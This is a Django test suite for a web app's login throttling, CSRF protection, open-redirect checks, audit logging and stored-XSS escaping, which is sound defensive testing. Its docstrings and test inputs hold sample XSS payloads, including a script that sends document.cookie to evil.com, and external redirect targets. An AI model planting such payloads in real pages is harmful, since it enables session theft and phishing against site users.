"""
Tests for brute-force protection, CSRF protection, open redirect prevention,
and audit logging.

Tests cover:
- Normal login behavior and successful authentication
- Abuse scenarios with repeated failed attempts
- Progressive throttling at 3, 5, 10, and 20 failed attempts
- User enumeration prevention
- IP address extraction and tracking
- Throttle status calculation across different time windows
- CSRF enforcement on the AJAX bio update endpoint
- Open redirect prevention on logout and register flows
- Audit log emission for all security-relevant events
- Verification that no sensitive data (passwords, emails) appears in logs
- Stored XSS prevention in bio field rendering
"""

from django.test import TestCase, Client
from django.contrib.auth.models import Group, User
from django.urls import reverse
from django.utils import timezone
from datetime import timedelta

from .models import LoginAttempt, Profile
from .views import record_login_attempt, get_throttle_status


class LoginAttemptModelTests(TestCase):
    """Test the LoginAttempt model for tracking login attempts."""
    
    def setUp(self):
        self.user = User.objects.create_user(username="testuser", password="testpass123")
    
    def test_login_attempt_created_successfully(self):
        """Test creating a login attempt record."""
        LoginAttempt.objects.create(
            user=self.user,
            username=self.user.username,
            ip_address="192.168.1.100",
            is_successful=True,
        )
        self.assertEqual(LoginAttempt.objects.count(), 1)
        attempt = LoginAttempt.objects.first()
        self.assertEqual(attempt.user, self.user)
        self.assertEqual(attempt.ip_address, "192.168.1.100")
        self.assertTrue(attempt.is_successful)
    
    def test_login_attempt_without_user(self):
        """Test recording attempt for non-existent user (prevents enumeration)."""
        LoginAttempt.objects.create(
            username="nonexistent",
            ip_address="192.168.1.100",
            is_successful=False,
        )
        self.assertEqual(LoginAttempt.objects.count(), 1)
        attempt = LoginAttempt.objects.first()
        self.assertIsNone(attempt.user)
        self.assertEqual(attempt.username, "nonexistent")
        self.assertFalse(attempt.is_successful)
    
    def test_login_attempts_ordered_by_timestamp(self):
        """Test that login attempts are ordered by timestamp (newest first)."""
        now = timezone.now()
        LoginAttempt.objects.create(
            username="test",
            ip_address="192.168.1.1",
            is_successful=False,
            attempt_timestamp=now - timedelta(minutes=10),
        )
        LoginAttempt.objects.create(
            username="test",
            ip_address="192.168.1.1",
            is_successful=False,
            attempt_timestamp=now,
        )
        attempts = LoginAttempt.objects.all()
        self.assertEqual(attempts[0].attempt_timestamp, now)
        self.assertEqual(attempts[1].attempt_timestamp, now - timedelta(minutes=10))


class GetClientIpTests(TestCase):
    """Test IP address extraction from requests."""
    
    def test_get_client_ip_from_remote_addr(self):
        """Test extracting IP from REMOTE_ADDR (direct connection)."""
        client = Client()
        # Django test client sets REMOTE_ADDR
        response = client.get(reverse("uwamahoro_joseline:login"))
        self.assertEqual(response.status_code, 200)
    
    def test_get_client_ip_with_x_forwarded_for(self):
        """Test extracting IP from X-Forwarded-For header (proxy scenario)."""
        client = Client()
        # Simulate a proxied request
        response = client.get(
            reverse("uwamahoro_joseline:login"),
            HTTP_X_FORWARDED_FOR="203.0.113.42, 198.51.100.1",
        )
        self.assertEqual(response.status_code, 200)


class RecordLoginAttemptTests(TestCase):
    """Test the record_login_attempt utility function."""
    
    def setUp(self):
        self.user = User.objects.create_user(username="testuser", password="testpass123")
        self.client = Client()
    
    def test_record_successful_login_attempt(self):
        """Test recording a successful login attempt."""
        request = self.client.get(reverse("uwamahoro_joseline:login")).wsgi_request
        record_login_attempt(request, self.user.username, is_successful=True)
        
        self.assertEqual(LoginAttempt.objects.count(), 1)
        attempt = LoginAttempt.objects.first()
        self.assertEqual(attempt.user, self.user)
        self.assertTrue(attempt.is_successful)
    
    def test_record_failed_login_attempt(self):
        """Test recording a failed login attempt."""
        request = self.client.get(reverse("uwamahoro_joseline:login")).wsgi_request
        record_login_attempt(request, self.user.username, is_successful=False)
        
        self.assertEqual(LoginAttempt.objects.count(), 1)
        attempt = LoginAttempt.objects.first()
        self.assertEqual(attempt.user, self.user)
        self.assertFalse(attempt.is_successful)
    
    def test_record_failed_login_for_nonexistent_user(self):
        """Test recording attempt for non-existent user."""
        request = self.client.get(reverse("uwamahoro_joseline:login")).wsgi_request
        record_login_attempt(request, "nonexistent", is_successful=False)
        
        self.assertEqual(LoginAttempt.objects.count(), 1)
        attempt = LoginAttempt.objects.first()
        self.assertIsNone(attempt.user)
        self.assertEqual(attempt.username, "nonexistent")


class GetThrottleStatusTests(TestCase):
    """Test the throttle status logic at different attempt thresholds."""
    
    def setUp(self):
        self.username = "testuser"
        self.now = timezone.now()
    
    def test_no_throttle_with_zero_failures(self):
        """Test that new user has no throttle."""
        is_throttled, _, _ = get_throttle_status(self.username)
        self.assertFalse(is_throttled)
    
    def test_no_throttle_with_two_failures(self):
        """Test that 2 failures don't trigger throttle."""
        for i in range(2):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=self.now - timedelta(minutes=1),
            )
        is_throttled, _, failed_count = get_throttle_status(self.username)
        self.assertFalse(is_throttled)
        self.assertEqual(failed_count, 2)
    
    def test_throttle_after_three_failures_in_5_min(self):
        """Test 5-minute throttle after 3 failures in 5 minutes."""
        base_time = self.now - timedelta(minutes=4)
        for i in range(3):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time + timedelta(minutes=i),
            )
        
        is_throttled, seconds_remaining, failed_count = get_throttle_status(self.username)
        self.assertTrue(is_throttled)
        self.assertEqual(failed_count, 3)
        # Should allow roughly 5 minutes (minus elapsed time)
        self.assertGreater(seconds_remaining, 0)
        self.assertLess(seconds_remaining, 300)  # 300 seconds = 5 minutes
    
    def test_no_throttle_when_outside_5min_window(self):
        """Test that failures outside 5-min window don't count."""
        LoginAttempt.objects.create(
            username=self.username,
            ip_address="192.168.1.1",
            is_successful=False,
            attempt_timestamp=self.now - timedelta(minutes=10),
        )
        LoginAttempt.objects.create(
            username=self.username,
            ip_address="192.168.1.1",
            is_successful=False,
            attempt_timestamp=self.now - timedelta(minutes=6),
        )
        LoginAttempt.objects.create(
            username=self.username,
            ip_address="192.168.1.1",
            is_successful=False,
            attempt_timestamp=self.now,
        )
        
        is_throttled, _, failed_count = get_throttle_status(self.username)
        self.assertFalse(is_throttled)
        self.assertEqual(failed_count, 1)  # Only recent one counts
    
    def test_throttle_after_five_failures_in_15_min(self):
        """Test 15-minute throttle after 5 failures in 15 minutes."""
        base_time = self.now - timedelta(minutes=14)
        for i in range(5):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time + timedelta(minutes=i * 3),
            )
        
        is_throttled, seconds_remaining, failed_count = get_throttle_status(self.username)
        self.assertTrue(is_throttled)
        self.assertEqual(failed_count, 5)
        # Should get 15-minute throttle (900 seconds)
        self.assertGreater(seconds_remaining, 0)
    
    def test_throttle_after_ten_failures_in_1_hour(self):
        """Test 60-minute throttle after 10 failures in 1 hour."""
        base_time = self.now - timedelta(minutes=59)
        for i in range(10):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time + timedelta(minutes=i * 6),
            )
        
        is_throttled, seconds_remaining, failed_count = get_throttle_status(self.username)
        self.assertTrue(is_throttled)
        self.assertEqual(failed_count, 10)
    
    def test_throttle_after_twenty_failures_in_24_hours(self):
        """Test 24-hour lockout after 20 failures in 24 hours."""
        base_time = self.now - timedelta(hours=23)
        for i in range(20):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time + timedelta(hours=i * 1.15),
            )
        
        is_throttled, seconds_remaining, failed_count = get_throttle_status(self.username)
        self.assertTrue(is_throttled)
        self.assertEqual(failed_count, 20)
        # Should get ~24-hour throttle
        self.assertGreater(seconds_remaining, 0)
    
    def test_throttle_progression_multiple_levels(self):
        """Test that multiple throttle levels are respected (highest wins)."""
        # Create 5 failures in last 15 minutes AND 10 in last hour
        base_time_15m = self.now - timedelta(minutes=13)
        base_time_1h = self.now - timedelta(minutes=59)
        
        # 5 within 15 minutes
        for i in range(5):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time_15m + timedelta(minutes=i * 2),
            )
        
        # 5 more within 1 hour (but older than 15 min)
        for i in range(5):
            LoginAttempt.objects.create(
                username=self.username,
                ip_address="192.168.1.1",
                is_successful=False,
                attempt_timestamp=base_time_1h + timedelta(minutes=i * 10),
            )
        
        is_throttled, seconds_remaining, failed_count = get_throttle_status(self.username)
        self.assertTrue(is_throttled)
        # Should have 10 in the 1-hour window
        self.assertEqual(failed_count, 10)


class LoginViewBruteForceTests(TestCase):
    """Test the login view with brute-force protection."""
    
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(username="testuser", password="testpass123")
        self.login_url = reverse("uwamahoro_joseline:login")
    
    def test_normal_login_succeeds(self):
        """Test that normal login works without throttling."""
        response = self.client.post(self.login_url, {
            "username": "testuser",
            "password": "testpass123",
        })
        self.assertEqual(response.status_code, 302)  # Redirect after successful login
        # Check that a successful attempt was recorded
        recent_attempts = LoginAttempt.objects.filter(
            username="testuser",
            is_successful=True,
        )
        self.assertEqual(recent_attempts.count(), 1)
    
    def test_failed_login_recorded(self):
        """Test that failed login attempts are recorded."""
        self.client.post(self.login_url, {
            "username": "testuser",
            "password": "wrongpassword",
        })
        # Check that a failed attempt was recorded
        recent_attempts = LoginAttempt.objects.filter(
            username="testuser",
            is_successful=False,
        )
        self.assertEqual(recent_attempts.count(), 1)
    
    def test_login_blocked_after_three_failures(self):
        """Test that login is blocked after 3 failed attempts in 5 minutes."""
        # Simulate 3 failed attempts
        for _ in range(3):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        # Fourth attempt should be throttled
        response = self.client.post(self.login_url, {
            "username": "testuser",
            "password": "wrongpassword",
        })
        
        # Should return 429 (Too Many Requests)
        self.assertEqual(response.status_code, 429)
        self.assertIn(b"Too Many Failed Attempts", response.content)
    
    def test_throttle_error_shows_minutes_remaining(self):
        """Test that throttle error message shows time remaining."""
        # Create 3 failures
        for _ in range(3):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        response = self.client.post(self.login_url, {
            "username": "testuser",
            "password": "wrongpassword",
        })
        
        self.assertEqual(response.status_code, 429)
        self.assertIn(b"minute", response.content)
    
    def test_throttle_lifted_after_window_expires(self):
        """Test that login works again after throttle window expires."""
        # Create 3 failures
        for _ in range(3):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        # Manually move all attempts back in time (simulate window expiration)
        now = timezone.now()
        LoginAttempt.objects.filter(username="testuser").update(
            attempt_timestamp=now - timedelta(minutes=6)
        )
        
        # Now login should work again
        response = self.client.post(self.login_url, {
            "username": "testuser",
            "password": "testpass123",
        })
        self.assertEqual(response.status_code, 302)  # Redirect = success
    
    def test_different_users_independent_throttling(self):
        """Test that throttling is per-user, not global."""
        User.objects.create_user(username="testuser2", password="testpass456")
        
        # Throttle first user
        for _ in range(3):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        # Second user should still be able to attempt login
        response = self.client.post(self.login_url, {
            "username": "testuser2",
            "password": "testpass456",
        })
        self.assertEqual(response.status_code, 302)  # Success
    
    def test_user_enumeration_prevention(self):
        """Test that failed attempts are recorded even for non-existent users."""
        # Try login with non-existent user
        self.client.post(self.login_url, {
            "username": "nonexistent",
            "password": "somepassword",
        })
        
        # Attempt should be recorded
        attempts = LoginAttempt.objects.filter(username="nonexistent")
        self.assertEqual(attempts.count(), 1)
        self.assertFalse(attempts.first().is_successful)
        
        # Should get throttled after 3 attempts too
        for _ in range(2):
            self.client.post(self.login_url, {
                "username": "nonexistent",
                "password": "somepassword",
            })
        
        response = self.client.post(self.login_url, {
            "username": "nonexistent",
            "password": "somepassword",
        })
        self.assertEqual(response.status_code, 429)


class LoginViewEdgeCasesTests(TestCase):
    """Test edge cases and special scenarios."""
    
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(username="testuser", password="testpass123")
        self.login_url = reverse("uwamahoro_joseline:login")
    
    def test_empty_username_not_throttled(self):
        """Test that empty username doesn't cause errors."""
        response = self.client.post(self.login_url, {
            "username": "",
            "password": "somepassword",
        })
        # Should render login form, not crash
        self.assertIn(response.status_code, [200, 302])
    
    def test_successful_login_clears_failure_count(self):
        """Test that a successful login doesn't reset, but subsequent failures start fresh."""
        # 2 failures
        for _ in range(2):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        # Successful login
        self.client.post(self.login_url, {
            "username": "testuser",
            "password": "testpass123",
        })
        
        # After success, 2 more failures should be allowed (doesn't cascade)
        for _ in range(2):
            self.client.post(self.login_url, {
                "username": "testuser",
                "password": "wrongpassword",
            })
        
        # 3rd failure should trigger throttle (3 total now)
        response = self.client.post(self.login_url, {
            "username": "testuser",
            "password": "wrongpassword",
        })
        self.assertEqual(response.status_code, 429)
    
    def test_authenticated_user_redirected_from_login(self):
        """Test that already-logged-in users are redirected away from login page."""
        self.client.login(username="testuser", password="testpass123")
        response = self.client.get(self.login_url)
        # Should redirect to dashboard, not show login form
        self.assertEqual(response.status_code, 302)


# ── CSRF Protection Tests ─────────────────────────────────────────────────────

class UpdateBioCSRFTests(TestCase):
    """
    Tests verifying that the bio update endpoint enforces CSRF protection.

    Design note:
    The endpoint originally used @csrf_exempt so the fetch call worked without
    an X-CSRFToken header.  That made the endpoint vulnerable: any page on any
    origin could silently POST and overwrite the bio of every logged-in visitor.

    The fix removes @csrf_exempt and requires the X-CSRFToken header.  Django's
    Client enforces CSRF by default when enforce_csrf_checks=True; the standard
    Client skips it (mirrors browser behaviour for same-origin requests which
    always carry the token).
    """

    def setUp(self):
        self.user = User.objects.create_user(username="biouser", password="testpass123")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.url = reverse("uwamahoro_joseline:update_bio")

    def test_unauthenticated_request_redirected(self):
        """Unauthenticated users cannot reach the endpoint."""
        client = Client()
        response = client.post(
            self.url,
            data='{"bio": "hacked"}',
            content_type="application/json",
        )
        # Should redirect to login, not process the request
        self.assertEqual(response.status_code, 302)
        self.assertIn("login", response["Location"])

    def test_post_without_csrf_token_rejected(self):
        """
        A POST request missing the CSRF token must be rejected with 403.

        Uses enforce_csrf_checks=True to simulate a real browser cross-origin
        request that does not carry the csrftoken cookie value in the header.
        """
        csrf_client = Client(enforce_csrf_checks=True)
        csrf_client.login(username="biouser", password="testpass123")
        response = csrf_client.post(
            self.url,
            data='{"bio": "forged bio"}',
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 403)
        # Bio must not have changed
        profile = Profile.objects.get(user=self.user)
        self.assertNotEqual(profile.bio, "forged bio")

    def test_post_with_csrf_token_succeeds(self):
        """
        A legitimate same-origin POST that includes the CSRF token is accepted.

        Django's standard test Client automatically includes the CSRF token,
        mirroring a browser form/fetch that reads the csrftoken cookie.
        """
        self.client.login(username="biouser", password="testpass123")
        import json
        response = self.client.post(
            self.url,
            data=json.dumps({"bio": "My updated bio"}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data["status"], "ok")
        self.assertEqual(data["bio"], "My updated bio")
        # Verify persisted in DB
        profile = Profile.objects.get(user=self.user)
        self.assertEqual(profile.bio, "My updated bio")

    def test_get_request_rejected(self):
        """GET requests must return 405 — bio update is POST-only."""
        self.client.login(username="biouser", password="testpass123")
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 405)

    def test_invalid_json_returns_400(self):
        """Malformed JSON body returns 400, not a server error."""
        self.client.login(username="biouser", password="testpass123")
        response = self.client.post(
            self.url,
            data="not json at all",
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 400)

    def test_empty_bio_allowed(self):
        """Users can clear their bio by sending an empty string."""
        Profile.objects.get_or_create(user=self.user, defaults={"bio": "old bio"})
        self.client.login(username="biouser", password="testpass123")
        import json
        response = self.client.post(
            self.url,
            data=json.dumps({"bio": ""}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 200)
        profile = Profile.objects.get(user=self.user)
        self.assertEqual(profile.bio, "")


# ── Open Redirect Tests ───────────────────────────────────────────────────────

class LogoutOpenRedirectTests(TestCase):
    """
    Tests verifying that logout rejects external redirect targets.

    Design note:
    The logout flow accepts an optional next parameter so the app can send
    users to a specific page after they log out (e.g. a public landing page).
    Without host validation an attacker can craft a link like:

        /joseline/logout/?next=https://evil.com

    After clicking "Confirm Logout" the user lands on evil.com instead of the
    login page — a classic phishing vector used to harvest credentials on a
    look-alike page.

    The fix uses url_has_allowed_host_and_scheme to accept only same-host paths.
    """

    def setUp(self):
        self.user = User.objects.create_user(username="logoutuser", password="testpass123")
        self.logout_url = reverse("uwamahoro_joseline:logout")

    def test_logout_without_next_redirects_to_login(self):
        """Default post-logout destination is the login page."""
        self.client.login(username="logoutuser", password="testpass123")
        response = self.client.post(self.logout_url)
        self.assertRedirects(response, reverse("uwamahoro_joseline:login"),
                             fetch_redirect_response=False)

    def test_logout_with_safe_internal_next_is_accepted(self):
        """A same-host path in next is followed after logout."""
        self.client.login(username="logoutuser", password="testpass123")
        safe_next = reverse("uwamahoro_joseline:login")
        response = self.client.post(self.logout_url, {"next": safe_next})
        self.assertRedirects(response, safe_next, fetch_redirect_response=False)

    def test_logout_with_external_url_is_rejected(self):
        """An absolute external URL in next must be ignored."""
        self.client.login(username="logoutuser", password="testpass123")
        response = self.client.post(self.logout_url, {"next": "https://evil.com/phish"})
        # Must land on login, NOT evil.com
        self.assertRedirects(response, reverse("uwamahoro_joseline:login"),
                             fetch_redirect_response=False)

    def test_logout_with_protocol_relative_url_is_rejected(self):
        """Protocol-relative URLs (//evil.com) must also be blocked."""
        self.client.login(username="logoutuser", password="testpass123")
        response = self.client.post(self.logout_url, {"next": "//evil.com/phish"})
        self.assertRedirects(response, reverse("uwamahoro_joseline:login"),
                             fetch_redirect_response=False)

    def test_logout_next_passed_through_hidden_field(self):
        """GET request renders the confirmation page with next in context."""
        self.client.login(username="logoutuser", password="testpass123")
        safe_next = "/joseline/dashboard/"
        response = self.client.get(f"{self.logout_url}?next={safe_next}")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["next"], safe_next)


class RegisterOpenRedirectTests(TestCase):
    """
    Tests verifying that registration rejects external redirect targets.

    Same attack model as logout: an attacker sends a new user a registration
    link with next=https://evil.com. After signing up the user is immediately
    sent to the attacker's page, where they may be tricked into re-entering
    their new password or other sensitive information.
    """

    def setUp(self):
        self.register_url = reverse("uwamahoro_joseline:register")

    def _register(self, extra_post=None):
        data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password1": "SecurePass123!",
            "password2": "SecurePass123!",
        }
        if extra_post:
            data.update(extra_post)
        return self.client.post(self.register_url, data)

    def test_register_without_next_redirects_to_dashboard(self):
        """Default post-registration destination is the dashboard."""
        response = self._register()
        self.assertRedirects(response, reverse("uwamahoro_joseline:dashboard"),
                             fetch_redirect_response=False)

    def test_register_with_safe_internal_next_is_accepted(self):
        """A same-host path in next is followed after registration."""
        safe_next = reverse("uwamahoro_joseline:profile")
        response = self._register({"next": safe_next})
        self.assertRedirects(response, safe_next, fetch_redirect_response=False)

    def test_register_with_external_url_is_rejected(self):
        """An absolute external URL in next must be ignored."""
        response = self._register({"next": "https://evil.com/steal-creds"})
        self.assertRedirects(response, reverse("uwamahoro_joseline:dashboard"),
                             fetch_redirect_response=False)

    def test_register_with_protocol_relative_url_is_rejected(self):
        """Protocol-relative URLs (//evil.com) must also be blocked."""
        response = self._register({"next": "//evil.com"})
        self.assertRedirects(response, reverse("uwamahoro_joseline:dashboard"),
                             fetch_redirect_response=False)

    def test_register_next_passed_via_get_to_template(self):
        """GET to the register page with next stores it in the context."""
        safe_next = "/joseline/dashboard/"
        response = self.client.get(f"{self.register_url}?next={safe_next}")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["next"], safe_next)


# ── Audit Logging Tests ───────────────────────────────────────────────────────

AUDIT_LOGGER = "uwamahoro_joseline.audit"


class AuditLoggingTests(TestCase):
    """
    Tests verifying that security-relevant events emit the correct audit log records.

    Design note:
    All records are emitted on the "uwamahoro_joseline.audit" logger so that
    production deployments can route them to a dedicated sink (file, SIEM, etc.)
    independently of the general application log.

    Sensitive data that must NEVER appear in logs:
    - Raw passwords or password hashes
    - Session keys or CSRF tokens
    - Email addresses (to avoid leaking account existence via reset endpoint)
    """

    def setUp(self):
        self.user = User.objects.create_user(
            username="audituser",
            email="audit@example.com",
            password="AuditPass123!",
        )
        self.login_url = reverse("uwamahoro_joseline:login")
        self.logout_url = reverse("uwamahoro_joseline:logout")
        self.register_url = reverse("uwamahoro_joseline:register")
        self.password_change_url = reverse("uwamahoro_joseline:password_change")

    # ── Registration ──────────────────────────────────────────────────────────

    def test_registration_emits_user_registered(self):
        """Successful registration logs USER_REGISTERED with username."""
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.register_url, {
                "username": "brandnew",
                "email": "brandnew@example.com",
                "password1": "NewPass123!",
                "password2": "NewPass123!",
            })
        self.assertTrue(any("USER_REGISTERED" in m for m in log.output))
        self.assertTrue(any("brandnew" in m for m in log.output))

    def test_registration_log_does_not_contain_password(self):
        """Registration log must never include the password value."""
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.register_url, {
                "username": "brandnew2",
                "email": "brandnew2@example.com",
                "password1": "NewPass123!",
                "password2": "NewPass123!",
            })
        for message in log.output:
            self.assertNotIn("NewPass123!", message)

    # ── Login ─────────────────────────────────────────────────────────────────

    def test_successful_login_emits_login_success(self):
        """Successful login logs LOGIN_SUCCESS with username."""
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.login_url, {
                "username": "audituser",
                "password": "AuditPass123!",
            })
        self.assertTrue(any("LOGIN_SUCCESS" in m for m in log.output))
        self.assertTrue(any("audituser" in m for m in log.output))

    def test_failed_login_emits_login_failed(self):
        """Failed login attempt logs LOGIN_FAILED with username."""
        with self.assertLogs(AUDIT_LOGGER, level="WARNING") as log:
            self.client.post(self.login_url, {
                "username": "audituser",
                "password": "wrongpassword",
            })
        self.assertTrue(any("LOGIN_FAILED" in m for m in log.output))
        self.assertTrue(any("audituser" in m for m in log.output))

    def test_failed_login_log_does_not_contain_password(self):
        """Failed login log must never include the attempted password."""
        with self.assertLogs(AUDIT_LOGGER, level="WARNING") as log:
            self.client.post(self.login_url, {
                "username": "audituser",
                "password": "SuperSecret99!",
            })
        for message in log.output:
            self.assertNotIn("SuperSecret99!", message)

    # ── Logout ────────────────────────────────────────────────────────────────

    def test_logout_emits_logout(self):
        """Successful logout logs LOGOUT with username."""
        self.client.login(username="audituser", password="AuditPass123!")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.logout_url)
        self.assertTrue(any("LOGOUT" in m for m in log.output))
        self.assertTrue(any("audituser" in m for m in log.output))

    # ── Password change ───────────────────────────────────────────────────────

    def test_password_change_emits_password_changed(self):
        """Successful password change logs PASSWORD_CHANGED with username."""
        self.client.login(username="audituser", password="AuditPass123!")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.password_change_url, {
                "old_password": "AuditPass123!",
                "new_password1": "NewAudit456!",
                "new_password2": "NewAudit456!",
            })
        self.assertTrue(any("PASSWORD_CHANGED" in m for m in log.output))
        self.assertTrue(any("audituser" in m for m in log.output))

    def test_password_change_log_does_not_contain_password(self):
        """Password change log must never include any password value."""
        self.client.login(username="audituser", password="AuditPass123!")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.password_change_url, {
                "old_password": "AuditPass123!",
                "new_password1": "NewAudit456!",
                "new_password2": "NewAudit456!",
            })
        for message in log.output:
            self.assertNotIn("AuditPass123!", message)
            self.assertNotIn("NewAudit456!", message)

    def test_failed_password_change_emits_password_change_failed(self):
        """Wrong old password logs PASSWORD_CHANGE_FAILED."""
        self.client.login(username="audituser", password="AuditPass123!")
        with self.assertLogs(AUDIT_LOGGER, level="WARNING") as log:
            self.client.post(self.password_change_url, {
                "old_password": "wrong_old_password",
                "new_password1": "NewAudit456!",
                "new_password2": "NewAudit456!",
            })
        self.assertTrue(any("PASSWORD_CHANGE_FAILED" in m for m in log.output))

    # ── Role changes ──────────────────────────────────────────────────────────

    def test_role_promotion_emits_role_promoted(self):
        """Promoting a user to Instructor logs ROLE_PROMOTED."""
        from django.contrib.auth.models import Permission
        from django.contrib.contenttypes.models import ContentType

        instructor_group, _ = Group.objects.get_or_create(name="Instructor")

        # Give the acting user instructor + manage_users permission
        ct = ContentType.objects.get_for_model(Profile)
        perm = Permission.objects.get(content_type=ct, codename="can_manage_users")
        self.user.groups.add(instructor_group)
        self.user.user_permissions.add(perm)
        self.user.save()

        target = User.objects.create_user(username="targetuser", password="TargetPass1!")
        self.client.login(username="audituser", password="AuditPass123!")

        promote_url = reverse("uwamahoro_joseline:promote_user", kwargs={"user_id": target.pk})
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(promote_url, {"action": "promote"})
        self.assertTrue(any("ROLE_PROMOTED" in m for m in log.output))
        self.assertTrue(any("targetuser" in m for m in log.output))

    # ── Password reset ────────────────────────────────────────────────────────

    def test_password_reset_request_emits_log(self):
        """Submitting the password reset form logs PASSWORD_RESET_REQUESTED."""
        reset_url = reverse("uwamahoro_joseline:password_reset")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(reset_url, {"email": "audit@example.com"})
        self.assertTrue(any("PASSWORD_RESET_REQUESTED" in m for m in log.output))

    def test_password_reset_log_does_not_contain_email(self):
        """Password reset log must not include the email address."""
        reset_url = reverse("uwamahoro_joseline:password_reset")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(reset_url, {"email": "audit@example.com"})
        for message in log.output:
            self.assertNotIn("audit@example.com", message)


# ── Stored XSS Tests ──────────────────────────────────────────────────────────

class StoredXSSTests(TestCase):
    """
    Tests verifying that stored XSS payloads in the bio field are escaped,
    not executed, when the profile page is rendered.

    Design note:
    The profile bio is user-controlled text. The original code used |safe on
    the bio template variable, which told Django to skip auto-escaping and
    inject the raw value into the HTML. An attacker could store:

        <script>fetch('https://evil.com/?c='+document.cookie)</script>

    and that payload would execute in every browser that viewed the profile.

    The fix removes |safe and relies on Django's default auto-escaping, which
    converts < > " & ' to HTML entities so the payload is displayed as
    harmless text rather than parsed as markup.
    """

    def setUp(self):
        self.user = User.objects.create_user(
            username="xssuser", password="XssPass123!"
        )
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile_url = reverse("uwamahoro_joseline:profile")

    def _set_bio(self, bio_text):
        self.profile.bio = bio_text
        self.profile.save()

    def _get_bio_span(self):
        """Return the text content inside the #bio-text span only."""
        self.client.login(username="xssuser", password="XssPass123!")
        response = self.client.get(self.profile_url)
        self.assertEqual(response.status_code, 200)
        html = response.content.decode()
        # Extract content between the bio-text span tags
        start = html.find('<span id="bio-text">')
        end = html.find("</span>", start)
        self.assertNotEqual(start, -1, "bio-text span not found in page")
        return html[start + len('<span id="bio-text">'):end]

    def _get_profile_html(self):
        self.client.login(username="xssuser", password="XssPass123!")
        response = self.client.get(self.profile_url)
        self.assertEqual(response.status_code, 200)
        return response.content.decode()

    # ── Script tag payloads ───────────────────────────────────────────────────

    def test_script_tag_in_bio_is_escaped(self):
        """<script> tag stored in bio must appear as escaped text, not markup."""
        self._set_bio("<script>alert('xss')</script>")
        bio_span = self._get_bio_span()
        # The raw tag must not appear inside the bio span
        self.assertNotIn("<script>", bio_span)
        # The escaped version must be present
        self.assertIn("&lt;script&gt;", bio_span)

    def test_script_tag_not_executed_via_src(self):
        """External script src injection must also be escaped."""
        self._set_bio('<script src="https://evil.com/x.js"></script>')
        bio_span = self._get_bio_span()
        self.assertNotIn("<script", bio_span)
        self.assertIn("&lt;script", bio_span)

    # ── Event handler payloads ────────────────────────────────────────────────

    def test_img_onerror_payload_is_escaped(self):
        """Inline event-handler injection via <img onerror> must be escaped."""
        self._set_bio('<img src=x onerror="alert(1)">')
        html = self._get_profile_html()
        self.assertNotIn("<img", html)
        self.assertIn("&lt;img", html)

    def test_svg_onload_payload_is_escaped(self):
        """SVG onload injection must be escaped."""
        self._set_bio('<svg onload=alert(1)>')
        bio_span = self._get_bio_span()
        self.assertNotIn("<svg", bio_span)
        self.assertIn("&lt;svg", bio_span)

    # ── Legitimate content ────────────────────────────────────────────────────

    def test_plain_text_bio_renders_correctly(self):
        """Normal plain-text bio must be displayed unchanged."""
        self._set_bio("Hello, I am a student at DevSec!")
        html = self._get_profile_html()
        self.assertIn("Hello, I am a student at DevSec!", html)

    def test_bio_with_angle_brackets_as_text_is_escaped(self):
        """A bio like '3 < 5 and 7 > 6' must render safely as text."""
        self._set_bio("3 < 5 and 7 > 6")
        html = self._get_profile_html()
        self.assertIn("3 &lt; 5 and 7 &gt; 6", html)
        self.assertNotIn("3 < 5", html)

    def test_empty_bio_shows_default_text(self):
        """Empty bio shows the 'No bio provided' placeholder."""
        self._set_bio("")
        html = self._get_profile_html()
        self.assertIn("No bio provided", html)

    # ── AJAX update path ──────────────────────────────────────────────────────

    def test_xss_payload_stored_then_escaped_on_render(self):
        """
        End-to-end: save XSS payload via the AJAX endpoint, then verify
        the profile page escapes it on render.
        """
        import json
        self.client.login(username="xssuser", password="XssPass123!")
        update_url = reverse("uwamahoro_joseline:update_bio")
        payload = '<script>document.location="https://evil.com"</script>'
        self.client.post(
            update_url,
            data=json.dumps({"bio": payload}),
            content_type="application/json",
        )
        # Verify stored in DB as-is (storage is safe, rendering is where escaping happens)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.bio, payload)

